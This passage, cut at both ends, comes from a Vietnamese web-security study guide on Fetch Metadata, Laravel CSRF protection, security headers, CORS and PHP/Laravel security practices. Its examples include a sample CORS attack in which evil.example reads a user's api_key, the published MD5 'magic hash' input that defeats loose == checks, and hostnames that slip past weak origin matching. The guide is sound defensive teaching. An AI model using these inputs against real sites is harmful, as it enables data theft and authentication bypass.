  dùng JSON hoặc HMAC trước khi unserialize dữ liệu của chính mình.
- Upload: allowlist đuôi, magic bytes chỉ là một lớp, tên ngẫu nhiên, lưu ngoài web root, phục vụ từ
  domain riêng; cẩn thận SVG, zip bomb, ảnh pixel khổng lồ.

**Nguồn**: [OWASP Top 10:2025](https://owasp.org/Top10/2025/) ([Introduction](https://owasp.org/Top10/2025/0x00_2025-Introduction/), [A01](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/), [A02](https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/), [A03](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/), [A10](https://owasp.org/Top10/2025/A10_2025-Mishandling_of_Exceptional_Conditions/)) · [OWASP API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/) · OWASP cheat sheets: [SSRF](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html), [XXE](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html), [Deserialization](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html), [Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html), [File Upload](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html), [OS Command Injection](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html), [Unvalidated Redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) · PortSwigger: [SSRF](https://portswigger.net/web-security/ssrf), [XXE](https://portswigger.net/web-security/xxe), [Path traversal](https://portswigger.net/web-security/file-path-traversal), [OS command injection](https://portswigger.net/web-security/os-command-injection), [Insecure deserialization](https://portswigger.net/web-security/deserialization), [File upload](https://portswigger.net/web-security/file-upload) · PHP: [unserialize](https://www.php.net/manual/en/function.unserialize.php), [escapeshellarg](https://www.php.net/manual/en/function.escapeshellarg.php), [libxml_disable_entity_loader](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php), [libxml constants](https://www.php.net/manual/en/libxml.constants.php), [filter flags](https://www.php.net/manual/en/filter.constants.php)

---

### 2.7 Header bảo mật, CSRF hiện đại, CORS

Module này trả lời: trình duyệt tự gắn những header nào để server biết request đến từ đâu (Fetch
Metadata) và Laravel 13 dùng chúng chống CSRF ra sao; server nên trả những header nào để trình duyệt
bảo vệ hộ; và vì sao CORS là cơ chế **nới lỏng** chứ không phải cơ chế bảo vệ, nên cấu hình sai là
lỗ hổng còn cấu hình đúng cũng không chống được CSRF.

Nhắc lại CSRF từ [module 1.3](#13-injection-xss-csrf): site độc khiến trình duyệt của nạn nhân gửi
request tới site của bạn, trình duyệt tự kèm cookie, server tưởng là nạn nhân thật. Cách cổ điển là
CSRF token; module này bàn cách hiện đại hơn.

#### Fetch Metadata

*Fetch Metadata request headers* là nhóm header `Sec-Fetch-*` mà trình duyệt tự gắn vào mọi
request, mô tả **ngữ cảnh** tạo ra request. Header có tiền tố `Sec-` là *forbidden header*: JavaScript
trên trang không đặt hay sửa được, nên server tin được (với request đến từ trình duyệt).

| Header | Cho biết | Giá trị |
|---|---|---|
| `Sec-Fetch-Site` | Quan hệ giữa origin khởi tạo request và origin đích. Tín hiệu chính để chống CSRF | `same-origin` (chính app của bạn), `same-site` (subdomain cùng site, ví dụ `api.shop.vn` gọi từ `www.shop.vn`), `cross-site` (site khác), `none` (user tự gõ URL, bấm bookmark) |
| `Sec-Fetch-Mode` | Kiểu request | `navigate` (điều hướng trang), `cors`, `no-cors` (ví dụ thẻ `<img>`), `same-origin`, `websocket` |
| `Sec-Fetch-Dest` | Request dùng để làm gì | `document`, `iframe`, `image`, `script`, `style`, `empty` (fetch/XHR), `object`, `embed`... |
| `Sec-Fetch-User` | Điều hướng do user thao tác (click) | `?1` |

Ví dụ: evil.example tự submit form `POST https://bank.vn/transfer` thì request mang
`Sec-Fetch-Site: cross-site`, `Sec-Fetch-Mode: navigate`, `Sec-Fetch-Dest: document`. Server chỉ cần
nhìn dòng đầu là biết từ chối.

*Resource isolation policy* (web.dev): chính sách chặn request cross-site tới tài nguyên của bạn,
trừ những gì chủ động cho phép. Các bước theo đúng thứ tự:
1. Không có `Sec-Fetch-Site` (trình duyệt cũ): cho qua, để lớp fallback (CSRF token, kiểm tra
   `Origin`) xử lý.
2. `same-origin`, `same-site`, `none`: cho qua. Nếu subdomain không đáng tin hoàn toàn (subdomain
   của bên thứ ba, subdomain có thể bị chiếm), bỏ `same-site` khỏi danh sách.
3. Điều hướng top-level bằng GET (`Sec-Fetch-Mode: navigate`, method GET, `Sec-Fetch-Dest` không
   phải `object`/`embed`): cho qua, để link từ site khác và từ email vẫn mở được trang.
4. Endpoint chủ động phục vụ cross-site (API có CORS, webhook, ảnh public): liệt kê rõ và cho qua;
   các endpoint này phải có xác thực riêng.
5. Còn lại: từ chối (403).

Viết thành middleware Laravel để hiểu cơ chế (Laravel 13 đã có sẵn cho CSRF, xem dưới; policy này
còn chặn được việc site khác nhúng endpoint GET JSON của bạn vào thẻ `<script>`, gọi là *XSSI*):

```php
<?php

declare(strict_types=1);

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

final class ResourceIsolationPolicy
{
    /** Endpoint chủ động cho cross-site, phải có xác thực riêng (chữ ký HMAC...) */
    private const CROSS_SITE_PATHS = ['webhooks/*', 'favicon.ico'];

    public function handle(Request $request, Closure $next): Response
    {
        $site = $request->header('Sec-Fetch-Site');

        // 1. Trình duyệt không gửi Fetch Metadata: để lớp CSRF token xử lý
        if ($site === null) {
            return $next($request);
        }
        // 2. Cùng origin, cùng site, hoặc user tự gõ URL
        if (in_array($site, ['same-origin', 'same-site', 'none'], true)) {
            return $next($request);
        }
        // 3. Điều hướng top-level bằng GET từ site khác (link, email), trừ object/embed
        if ($request->header('Sec-Fetch-Mode') === 'navigate'
            && $request->isMethod('GET')
            && !in_array($request->header('Sec-Fetch-Dest'), ['object', 'embed'], true)) {
            return $next($request);
        }
        // 4. Ngoại lệ đã liệt kê
        if ($request->is(...self::CROSS_SITE_PATHS)) {
            return $next($request);
        }
        // 5. Còn lại: cross-site và không phải điều hướng GET
        abort(403);
    }
}
```

Triển khai an toàn (web.dev và OWASP): chạy chế độ **chỉ log** trước để tìm luồng hợp lệ bị chặn
nhầm, rồi mới enforce. Google báo cáo phần lớn ứng dụng của họ tương thích sẵn với policy này. Nếu
response khác nhau theo các header này, thêm `Vary: Sec-Fetch-Site, Sec-Fetch-Mode, Sec-Fetch-Dest`
(hoặc ít nhất `Vary: Sec-Fetch-Site, Origin`) để CDN không trả nhầm bản cache. Từ chối request
**trước** khi chạy xác thực và logic khác, để không lộ thông tin qua thời gian phản hồi.

Giới hạn:
- Chỉ gửi tới URL "potentially trustworthy": thực tế là HTTPS (và `localhost`). Site chạy HTTP
  không nhận được header này; bật HSTS để luôn là HTTPS.
- Trình duyệt quá cũ không gửi. OWASP ghi các trình duyệt lớn đều hỗ trợ từ tháng 3/2023 (Safari
  từ 16.4). Vì vậy **bắt buộc có fallback**: CSRF token hoặc kiểm tra `Origin`.
- Proxy, gateway, load balancer cấu hình sai có thể xoá header `Sec-*` và `Origin`.
- Chỉ có ý nghĩa với request từ **trình duyệt**. Script `curl` gửi gì cũng được, nhưng CSRF vốn là
  tấn công qua trình duyệt của nạn nhân nên điều đó không phải lỗ hổng.

*Laravel 13*: middleware `Illuminate\Foundation\Http\Middleware\PreventRequestForgery` nằm sẵn
trong nhóm `web`, bảo vệ theo hai lớp:
1. Kiểm tra `Sec-Fetch-Site`. Nếu request là same-origin thì cho qua ngay, không cần token.
2. Không đạt (trình duyệt cũ không gửi header, kết nối không phải HTTPS...) thì fallback sang kiểm
   tra CSRF token truyền thống: field `_token` (Blade `@csrf`), header `X-CSRF-TOKEN`, hoặc header
   `X-XSRF-TOKEN` lấy từ cookie `XSRF-TOKEN` (Axios, Angular tự làm). Token sai trả HTTP 419.

Tuỳ chọn cấu hình trong `bootstrap/app.php`:

```php
->withMiddleware(function (Middleware $middleware): void {
    // Chỉ dựa vào kiểm tra origin, bỏ fallback token. Bị chặn trả 403 thay vì 419.
    $middleware->preventRequestForgery(originOnly: true);

    // Hoặc: chấp nhận cả same-site (dashboard.example.com nhận request từ example.com)
    // $middleware->preventRequestForgery(allowSameSite: true);

    // Loại trừ URI (webhook phải tự verify chữ ký HMAC thay cho CSRF)
    // $middleware->preventRequestForgery(except: ['stripe/*']);
})
```

⚠️ `originOnly: true` nghĩa là user dùng trình duyệt không gửi `Sec-Fetch-Site`, hoặc site chưa
chạy HTTPS, sẽ không gửi form được. ⚠️ `except` quá rộng (`webhook/*`, `api/*`, `*`) mở lỗ hổng
([module 2.8](#28-tầng-phplaravel)).

*Kiểm tra `Origin`*: header `Origin` cũng do trình duyệt đặt, JS không sửa được. Với request đổi
state (POST, PUT, PATCH, DELETE), so `Origin` với danh sách origin của mình là một lớp bổ sung rẻ.
OWASP coi đây là fallback chuẩn khi thiếu Fetch Metadata. Chú ý `Origin` có thể là `null` (redirect
cross-origin, iframe sandbox, `file://`): coi `null` là không tin cậy.

Đối chiếu ngôn ngữ: Go từ 1.25 có sẵn `http.CrossOriginProtection` trong thư viện chuẩn, cũng dựa
trên `Sec-Fetch-Site` (theo OWASP CSRF Cheat Sheet). Cùng một hướng: framework hiện đại chuyển từ
token sang Fetch Metadata, giữ token làm fallback.

#### Security headers

Đây là header **response** server gửi để bật các cơ chế bảo vệ có sẵn trong trình duyệt:

| Header | Tác dụng | Giá trị gợi ý (OWASP HTTP Headers Cheat Sheet) |
|---|---|---|
| `Strict-Transport-Security` | *HSTS*: trình duyệt chỉ dùng HTTPS với site trong `max-age` giây, kể cả khi user gõ `http://`. Chặn tấn công hạ cấp xuống HTTP | `max-age=63072000; includeSubDomains; preload` (63072000 giây là 2 năm) |
| `Content-Security-Policy` | Giới hạn nguồn script, style, frame, form. Lớp thứ hai chống XSS; `frame-ancestors` chống clickjacking | Xem bên dưới |
| `X-Content-Type-Options` | Trình duyệt không tự đoán MIME (*MIME sniffing*), ví dụ không coi file text do user upload là script | `nosniff` |
| `Referrer-Policy` | Kiểm soát header `Referer`: không gửi full URL (có thể chứa token, id) sang site khác | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Tắt API trình duyệt không dùng | `geolocation=(), camera=(), microphone=()` |
| `Cache-Control` | Response chứa dữ liệu nhạy cảm không được lưu ở cache | `no-store` |
| `Cross-Origin-Opener-Policy` | Tách cửa sổ khỏi các cửa sổ cross-origin mở nó, chống rò rỉ qua `window.opener` | `same-origin` |

Những ý hay bị hỏi vặn:
- ⚠️ HSTS `preload`: xin đưa domain vào danh sách cứng biên dịch sẵn trong trình duyệt, để ngay lần
  truy cập đầu tiên cũng là HTTPS. Rút ra khỏi danh sách rất chậm (phải chờ các bản phát hành trình
  duyệt), nên chỉ bật khi chắc chắn **mọi** subdomain chạy HTTPS lâu dài. Kể cả không preload, HSTS
  với `max-age` dài mà chứng chỉ hỏng thì user không vào được site cho tới khi hết hạn.
- ⚠️ `Cache-Control: no-cache` **không** cấm lưu cache; nó cho lưu nhưng bắt kiểm tra lại với server
  trước khi dùng. Muốn cấm lưu thì `no-store`. `private` chỉ cấm cache dùng chung (CDN, proxy).
- `X-Frame-Options` (`DENY`, `SAMEORIGIN`) là header cũ chống clickjacking, đã bị CSP
  `frame-ancestors` thay thế ở trình duyệt hỗ trợ. OWASP khuyên dùng `frame-ancestors` khi có thể,
  và vẫn liệt kê `X-Frame-Options: DENY` là giá trị nên đặt nếu dùng header này (hữu ích cho trình
  duyệt cũ). Giá trị `allow-from` không được Chrome và Safari hỗ trợ.
- `X-XSS-Protection`: header cũ, bản thân nó từng tạo ra lỗ hổng. OWASP khuyên không đặt, hoặc đặt
  `0` để tắt.
- Xoá header lộ công nghệ: `X-Powered-By` (PHP gửi `X-Powered-By: PHP/8.x` khi `expose_php=On`),
  và rút gọn `Server`.
- Header nào hợp với loại response nào: CSP và `frame-ancestors` có ý nghĩa với trang HTML; với API
  trả JSON thì `nosniff`, `Cache-Control`, CORS đúng mới là chính.
- Phục vụ file do user upload: `Content-Disposition: attachment`, `Content-Type:
  application/octet-stream` cho file không rõ loại, và `nosniff`.

*CSP* (Content Security Policy) chi tiết hơn:
- CSP "allowlist" liệt kê domain được phép (`script-src 'self' cdn.example.com`) dễ bị bypass (một
  endpoint JSONP hay thư viện cũ trên domain được phép là đủ). OWASP và Google khuyến nghị *strict
  CSP* dựa trên nonce hoặc hash:

  ```text
  Content-Security-Policy:
    script-src 'nonce-{RANDOM}' 'strict-dynamic';
    object-src 'none';
    base-uri 'none';
  ```

  - *Nonce*: chuỗi ngẫu nhiên sinh **mới cho mỗi response**, đặt trong header và trong thuộc tính
    `<script nonce="...">` của script hợp lệ. Script do kẻ tấn công chèn vào không biết nonce nên
    không chạy.
  - `'strict-dynamic'`: script đã có nonce hợp lệ được phép nạp tiếp script khác mà không cần nonce
    riêng (hợp với bundle JS hiện đại).
  - ⚠️ Không viết middleware tự thêm nonce vào **mọi** thẻ `<script>` trong HTML đầu ra: script do
    kẻ tấn công chèn cũng được thêm nonce. Nonce phải do template engine gắn vào đúng script của bạn.
- CSP cơ bản khi chưa làm strict được:
  `default-src 'self'; frame-ancestors 'self'; form-action 'self';` (chỉ tải tài nguyên cùng
  origin, không inline script, không cho site khác nhúng, form chỉ submit về chính mình).
- Triển khai: bật `Content-Security-Policy-Report-Only` trước (không chặn, chỉ báo vi phạm tới
  endpoint khai trong `report-to`/`report-uri`), sửa dần rồi mới chuyển sang header thật. Có thể
  chạy song song một policy chặt ở chế độ report-only và một policy lỏng hơn ở chế độ enforce.
- CSP qua thẻ `<meta http-equiv>` dùng được cho phần lớn directive, nhưng **không** hỗ trợ
  `frame-ancestors`, `sandbox` và endpoint báo cáo. Chống clickjacking phải bằng header.

Kiểm tra site thật: [Mozilla HTTP Observatory](https://developer.mozilla.org/en-US/observatory)
quét header và chấm điểm, kèm giải thích từng mục còn thiếu. Với Laravel, đừng giả định framework
đã gửi sẵn các header này; kiểm tra response thật (`curl -sI https://site.cua.ban`) rồi thêm bằng
middleware hoặc ở web server (Nginx `add_header`).

#### CORS

*Same-origin policy* (SOP) là luật nền của trình duyệt: JavaScript của trang thuộc origin A **không
đọc được response** từ origin B. *Origin* là bộ ba scheme + host + port: `https://shop.vn` và
`https://api.shop.vn` là hai origin khác nhau (dù cùng *site*), `http://shop.vn` và `https://shop.vn`
cũng khác nhau. Lưu ý SOP nói chung cho phép **gửi** request sang origin khác (form, `<img>`), chỉ
chặn **đọc** response.

*CORS* (Cross-Origin Resource Sharing) là cơ chế để server B **nới lỏng** SOP: B trả header báo "cho
phép origin A đọc response này". CORS không bảo vệ server, nó mở cửa. Không cấu hình CORS gì thì
site của bạn đang được SOP bảo vệ mặc định.

Luồng hoạt động:

```
Simple request (GET/HEAD/POST, Content-Type là form-urlencoded, multipart/form-data
hoặc text/plain, không có header tuỳ chỉnh):

  Trình duyệt ──── POST /api/x  (Origin: https://a.vn) ────► Server B   (request TỚI và CHẠY)
  Trình duyệt ◄─── 200 + Access-Control-Allow-Origin? ────── Server B
  Có header khớp: JS đọc được response.  Không có: JS bị chặn đọc (nhưng server đã xử lý xong).

Request khác (PUT/DELETE, Content-Type: application/json, header Authorization/X-...):

  Trình duyệt ──── OPTIONS /api/x  (preflight) ─────────────► Server B
                   Origin, Access-Control-Request-Method, Access-Control-Request-Headers
  Trình duyệt ◄─── Access-Control-Allow-Origin/-Methods/-Headers ─ Server B
  Server cho phép: trình duyệt mới gửi request thật.  Không cho: request thật không được gửi.
```

Các header response chính:
- `Access-Control-Allow-Origin`: một origin cụ thể, hoặc `*` (mọi origin).
- `Access-Control-Allow-Credentials: true`: cho phép request kèm cookie và cho JS đọc response đó.
  Trình duyệt **từ chối** kết hợp `Allow-Origin: *` với credentials, nên muốn kèm cookie thì phải
  ghi origin cụ thể.
- `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`: cho preflight.
- `Access-Control-Max-Age`: cache kết quả preflight.
- Khi server trả `Allow-Origin` khác nhau tuỳ `Origin` gửi lên, thêm `Vary: Origin` để cache không
  trả nhầm.

⚠️ Các cấu hình sai hay gặp (PortSwigger):
1. **Phản chiếu mọi `Origin`** kèm `Access-Control-Allow-Credentials: true`. Mọi site đều đọc được
   dữ liệu của user đang đăng nhập:

   ```
   GET /api/me            Origin: https://evil.example     Cookie: session=...
   200 OK
   Access-Control-Allow-Origin: https://evil.example
   Access-Control-Allow-Credentials: true
   {"email": "...", "api_key": "..."}      ← script trên evil.example đọc được
   ```

   Đây là lý do CORS sai được OWASP xếp vào A01 Broken Access Control.
2. So khớp origin bằng prefix, suffix hay regex lỏng: cho phép "mọi origin kết thúc bằng
   `shop.vn`" thì `hackershop.vn` qua; "bắt đầu bằng `https://shop.vn`" thì
   `https://shop.vn.evil.example` qua; regex `https://.*\.shop\.vn` quên neo `$` hoặc quên escape
   dấu chấm cũng vậy.
3. Whitelist origin `null` (hay dùng cho dev local): kẻ tấn công tạo được request có `Origin: null`
   bằng iframe sandbox.
4. Tin mọi subdomain: một subdomain có XSS, hoặc bị chiếm (*subdomain takeover*, ví dụ CNAME trỏ tới
   dịch vụ cloud đã huỷ), là đọc được API chính. Subdomain chạy HTTP thường còn cho kẻ nghe lén mạng
   chen vào.

Cấu hình đúng: allowlist **chính xác** từng origin (so sánh chuỗi đầy đủ), chỉ bật credentials khi
thật sự cần, chỉ mở CORS cho các path cần (`api/*`), không mở cho trang admin. `*` chỉ dùng cho API
public không dùng cookie (dữ liệu ai cũng xem được). Trong Laravel, CORS do middleware `HandleCors`
xử lý theo `config/cors.php` (các khoá như `paths`, `allowed_origins`, `allowed_origins_patterns`,
`supports_credentials`); Sanctum SPA cần `supports_credentials` và origin cụ thể.

⚠️ CORS không chặn request tới server, nó chỉ chặn JS **đọc** response. Vì vậy CORS không thay được
CSRF protection:
- Form HTML thường (`<form method="POST">` với `application/x-www-form-urlencoded`) là *simple
  request*: không có preflight, request tới server kèm cookie và **chạy bình thường**. Kẻ tấn công
  không đọc được kết quả, nhưng CSRF chỉ cần lệnh chạy (chuyển tiền, đổi email).
- ⚠️ API JSON tưởng an toàn vì "JSON phải preflight" nhưng lại chấp nhận `text/plain` (hoặc parse
  body bất kể `Content-Type`) thì bị CSRF bằng simple request. OWASP gợi ý server từ chối các
  content type simple ở endpoint JSON.
- Ngược lại, CORS **cho phép** preflight là thứ làm các biện pháp như "bắt buộc header tuỳ chỉnh"
  hoạt động: site lạ không gửi được header tuỳ chỉnh nếu server không cho phép origin đó trong
  preflight. Phòng thủ nằm ở chỗ server không cho phép, không phải ở CORS tự bảo vệ.

| Câu hỏi | Trả lời ngắn |
|---|---|
| CORS có chống CSRF không? | Không. CORS chỉ quyết định JS có đọc được response không; simple request vẫn tới và chạy |
| Vì sao CORS sai là lỗ hổng? | Nó mở SOP cho origin không đáng tin, site độc đọc được dữ liệu của user đang đăng nhập (nhất là khi kèm credentials) |
| Không bật CORS thì sao? | Được SOP bảo vệ mặc định: site khác không đọc được response |
| Vậy chống CSRF bằng gì? | Fetch Metadata (`Sec-Fetch-Site`), fallback CSRF token hoặc kiểm tra `Origin`, cộng cookie `SameSite` |

**Tóm tắt nhanh**
- `Sec-Fetch-Site` (`same-origin`/`same-site`/`cross-site`/`none`) do trình duyệt đặt, JS không sửa
  được; resource isolation policy chặn cross-site trừ điều hướng GET và ngoại lệ đã liệt kê. Chỉ có
  trên HTTPS, luôn cần fallback.
- Laravel 13 `PreventRequestForgery`: same-origin thì qua ngay, không thì fallback CSRF token (419);
  `originOnly: true` bỏ fallback (403); `allowSameSite: true` cho subdomain.
- Header nên có: HSTS (cẩn thận `preload`), strict CSP với nonce, `frame-ancestors` chống
  clickjacking, `nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `no-store` (không phải
  `no-cache`) cho dữ liệu nhạy cảm.
- CORS nới lỏng SOP, không bảo vệ server. Phản chiếu mọi `Origin` kèm credentials là cho mọi site
  đọc dữ liệu user. Allowlist chính xác từng origin, không `null`, không regex lỏng.
- CORS chỉ chặn đọc response, simple request (form POST) vẫn chạy, nên CORS không thay CSRF protection.

**Nguồn**: [web.dev: Protect your resources with Fetch Metadata](https://web.dev/articles/fetch-metadata) · OWASP: [CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html), [HTTP Headers Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html), [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) · PortSwigger: [CORS](https://portswigger.net/web-security/cors), [Clickjacking](https://portswigger.net/web-security/clickjacking) · Laravel: [CSRF Protection](https://laravel.com/docs/csrf) ([Origin Verification](https://laravel.com/docs/csrf#origin-verification)) · [Mozilla HTTP Observatory](https://developer.mozilla.org/en-US/observatory)

---

### 2.8 Tầng PHP/Laravel

Module này trả lời: Laravel và PHP làm sẵn những gì cho bảo mật, chỗ nào bạn vẫn phải tự quyết, và
cấu hình nào sai là mất trắng. Nhiều cơ chế ở đây đã được giải thích kỹ ở file PHP/Laravel
([05: Bảo mật đặc thù PHP](05-php-laravel.md#37-bảo-mật-đặc-thù-php) và
[05: Auth, Sanctum](05-php-laravel.md#27-các-thành-phần-khác-của-laravel)); module này gom lại dưới
góc nhìn bảo mật, thêm phần chọn cơ chế xác thực, xử lý sự cố lộ `APP_KEY` và checklist cấu hình.

#### PHP core

*Password.* Bộ ba hàm (chi tiết ở [1.1](#11-lưu-password)):

- `password_hash($pw, PASSWORD_DEFAULT)`: `PASSWORD_DEFAULT` hiện là bcrypt. Chuỗi kết quả tự chứa
  thuật toán, cost và salt, nên cột DB chỉ cần một trường (manual khuyên để cột rộng 255 ký tự vì
  `PASSWORD_DEFAULT` có thể đổi thuật toán trong tương lai).
- `password_verify($pw, $hash)`: tự đọc thuật toán và salt từ chuỗi hash, so sánh an toàn.
- `password_needs_rehash($hash, PASSWORD_DEFAULT)`: trả `true` khi hash được tạo với thuật toán
  hoặc cost khác cấu hình hiện tại.

PHP 8.4 tăng cost mặc định của bcrypt từ 10 lên **12** (ghi trong "PHP 8.4: Other Changes"). Hash
cũ cost 10 vẫn verify được bình thường; chúng chỉ được nâng cấp khi bạn rehash lúc user đăng nhập,
vì đó là lúc duy nhất bạn có password gốc:

```php
<?php
declare(strict_types=1);

function login(string $password, string $storedHash, callable $saveHash): bool
{
    if (!password_verify($password, $storedHash)) {
        return false;
    }
    // Đúng password: nhân tiện nâng hash lên cấu hình hiện tại (ví dụ cost 10 -> 12).
    if (password_needs_rehash($storedHash, PASSWORD_DEFAULT)) {
        $saveHash(password_hash($password, PASSWORD_DEFAULT));
    }
    return true;
}
```

Laravel làm sẵn bước này: `SessionGuard` rehash khi đăng nhập nếu cần, bật bằng
`'rehash_on_login' => true` (mặc định) trong cấu hình hashing; cost bcrypt của Laravel đọc từ
`BCRYPT_ROUNDS` (mặc định 12).

*Token ngẫu nhiên.* Dùng CSPRNG (bộ sinh số ngẫu nhiên an toàn mật mã) của hệ điều hành:

- `random_bytes(32)`: 32 byte ngẫu nhiên. `bin2hex(random_bytes(32))` cho token 64 ký tự hex
  (mỗi byte thành 2 ký tự), tức 256 bit entropy.
- `random_int(0, 999999)`: số nguyên đều trong khoảng, dùng cho OTP 6 chữ số
  (`str_pad((string) random_int(0, 999999), 6, '0', STR_PAD_LEFT)`).
- ⚠️ `rand()`, `mt_rand()`, `uniqid()` đoán được, không dùng cho bất cứ thứ gì bí mật.

*So sánh bí mật.* `hash_equals($known, $userInput)` so constant-time (thời gian không phụ thuộc vị
trí byte sai đầu tiên), chống timing attack. HMAC cho webhook: `hash_hmac('sha256', $rawBody,
$secret)` rồi `hash_equals`. Ví dụ đầy đủ và bẫy "ký trên raw body" ở
[05: Type juggling trong so sánh](05-php-laravel.md#37-bảo-mật-đặc-thù-php).

*Sodium.* Extension `sodium` (libsodium) có sẵn trong PHP từ 7.2. Đây là API "khó dùng sai": chọn
sẵn thuật toán tốt, luôn kèm xác thực.

| Hàm | Việc | Ghi chú |
|---|---|---|
| `sodium_crypto_secretbox` / `_open` | Mã hoá đối xứng có xác thực (XSalsa20-Poly1305) | Một key chung, nonce ngẫu nhiên mỗi lần |
| `sodium_crypto_aead_xchacha20poly1305_ietf_encrypt` / `_decrypt` | AEAD, có thêm *associated data* (dữ liệu được xác thực nhưng không mã hoá, ví dụ id bản ghi) | Nonce 24 byte, sinh ngẫu nhiên thoải mái |
| `sodium_crypto_sign` / `sodium_crypto_sign_detached` | Chữ ký Ed25519 | Bên kiểm chỉ cần public key |
| `sodium_crypto_box` | Mã hoá khoá công khai giữa hai bên | |

```php
<?php
declare(strict_types=1);

$key   = sodium_crypto_secretbox_keygen();                    // 32 byte
$nonce = random_bytes(SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);     // 24 byte, mới cho mỗi message
$box   = sodium_crypto_secretbox('số thẻ 4111...', $nonce, $key);
$blob  = $nonce . $box;                                        // lưu nonce cùng ciphertext

$plain = sodium_crypto_secretbox_open(
    substr($blob, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES),
    substr($blob, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES),
    $key,
);
var_dump($plain === false);   // bool(false): giải mã được. Sửa 1 byte của $blob thì open trả false
```

Vì sao "dùng Sodium thay vì tự ghép OpenSSL": bài của Paragon IE giải thích rằng mã hoá mà không
xác thực (ví dụ AES-CBC trần) thì kẻ tấn công **sửa được ciphertext** để đổi plaintext một cách có
kiểm soát (bài minh hoạ bằng cách sửa một byte của IV trong cookie để đổi `admin` từ 0 thành 1).
Thêm nữa, với CBC không MAC, nếu server để lộ "padding sai" khác "giải mã lỗi" qua thông báo lỗi
thì kẻ tấn công có thể giải mã dần từng byte (*padding oracle*). Cách đúng là *authenticated encryption*: hoặc AEAD, hoặc
*encrypt-then-MAC* (mã hoá xong mới tính MAC trên ciphertext, và kiểm MAC bằng so sánh
constant-time **trước khi** giải mã). Tự ghép `openssl_encrypt` + `hash_hmac` dễ sai thứ tự, quên
MAC IV, hay so MAC bằng `==`. Sodium và `Crypt` của Laravel đã làm đúng việc này.

*Hai cái bẫy riêng của PHP* (cơ chế đầy đủ ở [05: Bảo mật đặc thù PHP](05-php-laravel.md#37-bảo-mật-đặc-thù-php)):

- ⚠️ `unserialize()` với dữ liệu người dùng là *object injection*: chuỗi serialize quyết định class
  nào được tạo, magic method (`__wakeup`, `__destruct`) chạy tự động và khởi động một *gadget chain*
  tới RCE. Dùng JSON; bắt buộc thì `['allowed_classes' => false]`. Xem thêm
  [2.6](#26-lỗ-hổng-web-và-api-theo-owasp).
- ⚠️ `==` so lỏng: hai *numeric string* (chuỗi trông như số) được so như **số**.

```php
<?php
declare(strict_types=1);   // strict_types không ảnh hưởng toán tử so sánh, chỉ ảnh hưởng tham số hàm

var_dump("0e123" == "0e456");    // bool(true):  cả hai là 0 × 10^n = 0
var_dump("0e123" === "0e456");   // bool(false)
var_dump(md5('240610708') == md5('QNKCDZO'));   // bool(true): hai hash MD5 dạng 0e + toàn chữ số
```

Nếu code kiểm password kiểu `md5($input) == $storedHash` và hash lưu trong DB có dạng `0e` + toàn
chữ số, thì bất kỳ input nào cho ra hash dạng đó cũng "khớp". Kẻ tấn công chỉ cần một chuỗi như
`240610708` (đã được công bố) là qua. PHP 8 **không** sửa trường hợp này: PHP 8 chỉ đổi cách so số
với chuỗi không phải số. Quy tắc: `===` ở mọi nơi, `hash_equals` cho chuỗi bí mật, và không lưu
password bằng MD5 ngay từ đầu.

#### Laravel: xác thực

Laravel có bốn lựa chọn chính. Chọn theo *loại client*, không theo sở thích:

| Loại client | Chọn | Cơ chế | Vì sao |
|---|---|---|---|
| Web render phía server (Blade, Livewire, Inertia) | Session guard (`web`) | Session cookie + CSRF | Mặc định của framework, không có token nào để lộ |
| SPA của chính bạn, chung top-level domain với API | Sanctum SPA | Vẫn là session cookie của guard `web`, CSRF qua `XSRF-TOKEN` | Token không bao giờ nằm trong JavaScript, XSS không lấy được để mang đi |
| Mobile app của bạn, script, CLI, API key cho khách | Sanctum API token | *Personal access token* gửi qua `Authorization: Bearer`, DB lưu SHA-256 của token | Đơn giản, thu hồi từng token được |
| App bên thứ ba đăng nhập bằng tài khoản của bạn, hoặc cần chuẩn OAuth2 | Passport | Authorization server OAuth2 đầy đủ (dựa trên League OAuth2 Server) | Có client registration, consent, authorization code + PKCE, client credentials, refresh token |

Những chi tiết hay bị hỏi vặn (theo docs Sanctum):

- Sanctum SPA yêu cầu SPA và API **chung top-level domain** (khác subdomain được), khai domain SPA
  trong `stateful`, gọi `$middleware->statefulApi()`, và CORS phải `supports_credentials = true`.
  SPA gọi `GET /sanctum/csrf-cookie` trước khi login.
- Docs nói thẳng: không dùng API token để xác thực SPA first-party của bạn; dùng SPA mode.
- ⚠️ Token Sanctum mặc định **không hết hạn**. Đặt `expiration` (phút) trong `config/sanctum.php`
  hoặc truyền thời hạn khi `createToken(...)`, và lên lịch `sanctum:prune-expired` để dọn bản ghi.
- ⚠️ Với request đến từ SPA (cookie), `tokenCan()` luôn trả `true`. Policy phải kiểm cả quyền của
  user (`$user->id === $server->user_id`), không chỉ ability của token.
- Sanctum xét cookie trước, không có cookie mới xét Bearer token.
- Sanctum **không** phải OAuth2: không có authorization code flow, không có "app bên thứ ba xin
